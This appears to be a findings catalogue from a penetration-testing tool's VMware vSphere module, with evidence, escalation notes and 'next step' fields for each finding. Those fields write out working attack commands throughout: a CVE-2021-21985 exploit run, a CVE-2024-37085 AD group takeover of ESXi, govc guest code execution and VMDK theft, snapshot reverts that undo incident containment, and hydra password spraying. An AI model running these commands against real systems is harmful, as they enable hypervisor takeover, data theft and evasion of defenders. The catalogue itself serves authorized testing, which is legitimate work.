summary: Very deep vSphere module. Fingerprint + strict build->CVE mapping (T1 CVE candidate). SessionManager.Login sweep against operator + vendor default creds is T3 initial-access. Post-auth inventory/session/local-users enum is T4 chain material. Missing: no active exploit for -21985 or -34048; ESXi 'ESX Admins' finding is version-only, not an actual AD-group probe (can't be — needs AD).

findings.promotion_notes: Ground-truth AboutInfo; feeds every other finding.

findings.tier_evidence: Deterministic integer build comparison against a curated patch matrix — probe SUCCEEDS ONLY IF build < patched_build. Non-destructive, exact.
findings.promotion_notes: For -21985, send a benign version-probe request to the vROps plugin endpoint (e.g. /ui/vropspluginui/rest/services/ ) and note the status; for -34048, no safe DCE-RPC probe exists.
findings.tester_next_step: Match CVE to exploit: -21985 -> github.com/psc4re/NSE-scripts/blob/master/CVE-2021-21985.nse; -34048 -> proof-of-concept only in labs; ensure ROE before firing.

findings.title_pattern: vSphere Client pre-auth RCE CVE-2021-21985 candidate
findings.tier_evidence: Fires only when build is below the specific -21985 patch line — build-gated CVE candidate.
findings.promotion_notes: Wire up a controlled write of a canary file via the vROps plugin deserialization (public exploit); dropping a webshell is T3 initial access. Currently module refuses to fire the payload.
findings.tester_next_step: python3 CVE-2021-21985.py -t IP  # only in a lab / ROE-approved engagement; writes files on the appliance.

findings.title_pattern: ESXi CVE-2024-37085 candidate ('ESX Admins' AD auto-promote)
findings.promotion_notes: Requires an AD write primitive from a captured cred to create the 'ESX Admins' group; a real T3 chain when paired with LDAP creds. Cannot promote without AD reach.
findings.tester_next_step: If AD-joined + you hold Domain Admin: net group 'ESX Admins' /add /domain ; net group 'ESX Admins' <attacker-user> /add /domain ; ssh <attacker-user>@<esxi-ip>  # full ESXi admin

findings.tier_evidence: Extracted from AboutInfo + cert CN — recon.
findings.promotion_notes: Chain into administrator@<sso> login attempt (module already does).

findings.tester_next_step: openssl s_client -connect IP:443 -servername <cn> </dev/null | openssl x509 -text | grep -i dns

findings.tier_evidence: SessionManager.Login accepted with a live vmware_soap_session cookie — that IS a live admin session on vCenter/ESXi. Not just a credential match: recce holds an authenticated API handle. Follow-on SessionList + inventory calls use that cookie.
findings.promotion_notes: Chain to: DatastoreBrowser (dump VM VMDKs), GuestOperationsManager.startProgram (RCE inside a Windows/Linux VM guest), or CVE-2024-37085 AD group manipulation. All destructive.
findings.tester_next_step: govc: export GOVC_URL='https://<user>@IP' GOVC_INSECURE=1 GOVC_PASSWORD='<pw>'; govc ls -l; govc guest.run -vm <vm> -l root:<pw> id  # or use pyvmomi to pull VMDKs off the datastore

findings.tier_evidence: SessionList requires an authenticated cookie; when it fires, recce is authenticated and pulls real operator identities + admin workstation IPs.
findings.promotion_notes: Feed operator usernames into known_users for downstream spray; admin workstation IPs -> relay_targets for SMB relay / rundll32 payloads.
findings.tester_next_step: govc session.ls ; then port-scan each ip_address in the list for RDP/WinRM/SMB — those are admin workstations

findings.title_pattern: vCenter inventory enumerated: N ESXi host(s), M VM(s)
findings.tier_evidence: Post-auth RetrievePropertiesEx returns HostSystem + VirtualMachine — this is real vCenter API control, each host now a hypervisor foothold target.
findings.promotion_notes: For each managed host, retry vsphere_valid_creds with the same SSO cookie on the ESXi /sdk directly — many share a Vault-issued cert principal. And run GuestOperations startProgram inside each VM (CVE-2017-4924-style).
findings.tester_next_step: govc ls host ; govc ls vm ; govc host.esxcli -host <host> system version get ; govc guest.run -vm <vm> -l administrator:'' whoami

findings.tier_evidence: Snapshot list requires authenticated inventory read — real API control.
findings.promotion_notes: Snapshot.revert to defeat post-compromise IR / cred rotation on the guest OS. Destructive by design.
findings.tester_next_step: govc snapshot.tree -vm <critical-vm> ; govc snapshot.revert -vm <critical-vm> <snap>  # ROE-required; undoes IR containment

findings.title_pattern: vCenter Enhanced Linked Mode / peer vCenter(s) named
findings.tier_evidence: managementServerIp on managed hosts requires authenticated inventory read.
findings.promotion_notes: Retry same SSO creds against peer vCenter /sdk — Enhanced Linked Mode shares SSO across the estate.
findings.tester_next_step: For each linked IP: GOVC_URL=https://<user>@<peer-ip> govc about  # confirm same creds work on the peer

findings.tier_evidence: HostLocalAccountManager.RetrieveUserGroups requires authenticated ESXi session — real post-auth read.
findings.promotion_notes: Feed principals into known_users; spray each account against SSH on ESXi with vendor defaults + captured pw.
findings.tester_next_step: esxcli system account list ; hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<esxi-ip> -t 4 -f

findings.promotion_notes: Add a VAMI-specific default-cred probe (root/vmware / root/'') on /rest/appliance/access/consolecli.
